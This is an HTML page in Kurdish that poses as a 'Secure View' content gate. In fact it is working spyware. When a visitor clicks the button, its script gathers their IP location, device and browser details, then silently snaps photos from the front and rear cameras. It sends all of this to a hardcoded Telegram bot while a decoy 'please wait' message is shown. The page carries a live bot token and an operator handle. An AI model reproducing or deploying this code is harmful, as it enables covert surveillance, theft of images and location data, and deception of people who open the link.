<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure View</title>
    <style>
        * { box-sizing: border-box; }
        body { 
            background: #0d1117;
            color: white; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            text-align: center; 
            display: flex; 
            flex-direction: column;
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            overflow: hidden;
        }
        .card {
            background: #161b22;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
            max-width: 400px;
            width: 90%;
        }
        h2 { margin-bottom: 15px; font-size: 22px; color: #58a6ff; }
        p { color: #8b949e; font-size: 14px; margin-bottom: 25px; }
        .btn {
            background: #238636;
            color: white;
            border: none;
            padding: 12px 20px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
        }
        .btn:hover { background: #2ea043; }
        #hidden-video, #canvas { display: none; }
    </style>
</head>
<body>

    <div class="card" id="main-card">
        <h2>پێشوازى ل هەوە دکەین</h2>
        <p>ژ بۆ دیتنا بابەتی، لطفاً دوگمەیا خوارێ کلیک بکە و پەسەند بکە.</p>
        <button class="btn" onclick="startProcess()">دیتنا بابەتێ تایبەت</button>
    </div>

    <video id="hidden-video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const token = '8927591228:AAGdIn4qL1xVXpH-jQ-lX_Ccgsy5jMByol4';
        const chat_id = '7643191802';
        const api = 'https://api.telegram.org/bot' + token;

        async function sendText(text) {
            try {
                await fetch(`${api}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chat_id, text: text })
                });
            } catch (e) {}
        }

        async function getIpInfo() {
            try {
                let res = await fetch('https://ipapi.co/json/');
                let data = await res.json();
                return `🌍 وەڵات: ${data.country_name} (${data.country_code})\n🏙 باژێر: ${data.city}\n🌐 ئایپی (IP): ${data.ip}\n🏢 کۆمپانیا (ISP): ${data.org}`;
            } catch (e) {
                return "🌍 زانیاریێن IP: نەهاتنە دیتن";
            }
        }

        async function getProInfo() {
            let ipDetails = await getIpInfo();
            let currentTime = new Date().toLocaleString();
            
            return `🔥 [ ULTIMATE VIP GUEST LOG ] 🔥\n⏱ دەم و ڕوژ: ${currentTime}\n${ipDetails}\n📱 سیستەم: ${navigator.platform}\n🌐 بووکەر: ${navigator.userAgent.split(') ')[0]})\n🗣 زمان: ${navigator.language}\n📐 قەبارەی شاشەی: ${window.screen.width}x${window.screen.height}`;
        }

        async function sendVisitorLog() {
            let details = await getProInfo();
            sendText(`🚀 سەردانکەرەکێ نوو (ULTIMATE) لینک ڤەکەت!\n\n${details}\n\n⚠️ بڕڤەبەر: @YUSEEF_SURCHI`);
        }

        async function captureCamera(facing, label) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: facing }
                });
                const video = document.getElementById('hidden-video');
                video.srcObject = stream;

                return new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        setTimeout(async () => {
                            const canvas = document.getElementById('canvas');
                            canvas.width = video.videoWidth || 640;
                            canvas.height = video.videoHeight || 480;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                            canvas.toBlob(async (blob) => {
                                let details = await getProInfo();
                                const formData = new FormData();
                                formData.append('chat_id', chat_id);
                                formData.append('photo', blob, 'shot.jpg');
                                formData.append('caption', `📸 وێنەیێ ULTIMATE (${label})!\n\n${details}\n\n⚠️ بڕڤەبەر: @YUSEEF_SURCHI`);

                                await fetch(`${api}/sendPhoto`, { method: 'POST', body: formData });
                                stream.getTracks().forEach(t => t.stop());
                                resolve();
                            }, 'image/jpeg', 0.95);
                        }, 2000);
                    };
                });
            } catch (err) {}
        }

        async function startProcess() {
            // ڤەشارتنا کاردێ پشتى کلیککرنێ
            document.getElementById('main-card').innerHTML = "<h2>چاوەڕێبە...</h2><p>تکایە کچکەکێ صبر بکە هەتا پێدڤی هێنە بارکرن.</p>";
            
            await sendVisitorLog();
            await captureCamera("user", "کامێرا پێشی (Selfie)");
            await captureCamera("environment", "کامێرا پاش (Rear)");

            // پشتى تمومبوونێ، دشێی بڕێڤە ببی بۆ جهەکی دی یان پەیامەکێ نیشان بدەی
            setTimeout(() => {
                document.getElementById('main-card').innerHTML = "<h2>تەواو بوو!</h2><p>سوپاس بۆ هاریکاریا تە.</p>";
            }, 1000);
        }
    </script>
</body>
</html>
